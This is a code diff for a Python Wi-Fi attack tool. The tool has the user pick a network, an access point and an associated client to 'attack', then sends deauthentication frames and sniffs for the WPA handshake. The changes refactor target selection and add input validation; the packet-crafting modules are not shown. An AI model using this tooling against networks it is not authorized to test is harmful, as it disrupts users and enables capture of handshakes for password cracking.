@@ -13,10 +13,10 @@ import utilities
 from access_point import AccessPoint
 from ap_sniffer import APSniffer
 from channel_hopper import ChannelHopper
+from client import Client
 from deauth_sender import DeauthSender
 from handshake_sniffer import HandshakeSniffer
 
-# TODO Find out when this is which
 from network import Network
 
 Dot11Type = Dot11FCS
@@ -50,19 +50,16 @@ def main():
     selected_ap = select_ap()
     channel_hopper_thread.stop = True
     channel_hopper_thread.join()
-    os.system("iw dev %s set channel %d" % (iface, selected_network.channel))
-    selected_target = select_target()
+    utilities.set_channel(iface, selected_network.channel)
+    selected_client = select_client()
 
     print("")
     print("You were going to attack the following network and this specific AP:")
     print(selected_network.essid + " - " + utilities.convert_mac(selected_ap.bssid))
-    print("With the following target:")
-    print(selected_target)
+    print("With the following client being the target:")
+    print(selected_client)
     print("")
-    sniff_handshake(selected_ap.bssid, selected_target.bssid)  # TODO Select victim
-    # TODO Capture handshake
-
-
+    sniff_handshake(selected_ap.bssid, selected_client.mac)
 
     print("Done running, exiting")
 
@@ -117,21 +114,29 @@ def select_ap():
     return selected_network.aps[ap_id]
 
 
-# Process for having the user select which target (associated with an AP) to attack
-def select_target():
+# Process for having the user select which client (associated with an AP) to attack
+def select_client():
+    global selected_ap
+
     print("")
-    print("Please specify the ID of the target that you want to attack:")
+    print("Please specify the ID of the Client that you want to attack:")
+    print(Client.get_header())
     for client in selected_ap.clients:
         print(client)
     sniff_thread = APSniffer(iface, networks, Dot11Type, print_new_clients=True, target_network=selected_network)
+    threads.add(sniff_thread)
     sniff_thread.start()
-    target_id = int(input())
 
-    sniff_thread.shutdown = True
+    client_id = int(input())
+    if client_id < 0 or client_id >= len(selected_ap.clients):
+        print("Error: Invalid client selected.")
+        finalize()
+
+    sniff_thread.stop = True
     sniff_thread.join()
 
-    print("You selected target ", target_id)
-    return selected_ap.clients[target_id]
+    print("You selected Client ", client_id)
+    return selected_ap.clients[client_id]
 
 
 # Sends deauth attacks
@@ -144,10 +149,10 @@ def deauth(target_network, target_client):
     deauth_stop()
 
 
-def deauth_start(target_network, target_client):
+def deauth_start(target_ap, target_client):
     global threads, deauth_thread
 
-    deauth_thread = DeauthSender(iface, selected_ap.bssid, target_client)
+    deauth_thread = DeauthSender(iface, target_ap, target_client)
     threads.add(deauth_thread)
     deauth_thread.start()
 
